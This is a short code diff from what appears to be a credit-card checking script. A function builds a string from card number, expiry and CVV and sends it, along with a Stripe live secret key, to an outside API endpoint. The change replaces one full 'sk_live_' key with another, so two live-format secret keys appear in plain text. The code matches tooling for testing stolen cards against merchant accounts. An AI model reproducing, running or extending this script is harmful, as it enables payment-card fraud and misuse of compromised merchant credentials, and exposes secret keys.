@@ -25,7 +25,7 @@ async def process_credit_card(cc_entry):
             url = "https://mvy.ai/sk_api/api.php"
             params = {
                 "lista": f"{ccn}:{mm}:{yy}:{cvv}",
-                "sk": "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"
+                "sk": "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"
             }
 
             async with session.get(url, params=params) as response:
